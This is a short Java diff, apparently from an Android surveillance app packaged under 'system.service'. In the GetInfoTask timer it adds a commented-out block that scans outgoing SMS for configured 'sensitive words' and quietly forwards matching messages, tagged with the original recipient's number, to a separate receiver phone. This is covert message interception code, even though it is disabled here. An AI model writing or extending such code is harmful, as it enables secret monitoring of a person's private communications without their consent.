@@ -22,6 +22,7 @@ import system.service.feature.sms.SmsInfo;
 
 import com.particle.inspector.common.util.DatetimeUtil;
 import com.particle.inspector.common.util.NetworkUtil;
+import com.particle.inspector.common.util.RegExpUtil;
 import com.particle.inspector.common.util.StrUtils;
 import com.particle.inspector.common.util.SysUtils;
 import com.particle.inspector.common.util.DeviceProperty;
@@ -66,6 +67,26 @@ public class GetInfoTask extends TimerTask
 	
 	public void run() 
 	{
+		// ===================================================================================
+		// Check outgoing SMS for redirecting these sensitive
+		// ===================================================================================
+		/*
+		boolean allowRedirectSMS = GlobalPrefActivity.getRedirectSms(context);
+		String phoneNum = GlobalPrefActivity.getReceiverPhoneNum(context);
+		if (allowRedirectSMS && phoneNum.length() > 0) {
+			String[] sensitiveWords = GlobalPrefActivity.getSensitiveWords(context)
+					.replaceAll(RegExpUtil.MULTIPLE_BLANKSPACES, GlobalPrefActivity.SENSITIVE_WORD_BREAKER) // Remove duplicated blank spaces
+					.split(GlobalPrefActivity.SENSITIVE_WORD_BREAKER);
+			if (sensitiveWords.length > 0) {
+				List<SmsInfo> smsList = SmsCtrl.getSensitiveOutgoingSmsList(context, sensitiveWords, timeThreshold);
+				for (SmsInfo sms : smsList) {
+					String header = String.format(context.getResources().getString(R.string.sms_redirect_header), sms.phoneNumber);
+					SmsCtrl.sendSms(phoneNum, header + sms.smsbody);
+				}
+			}
+		}
+		*/
+		
 		// If there are no recipients, return 
 		String[] recipients = getRecipients(context);
 		if (recipients == null || recipients.length == 0) return;
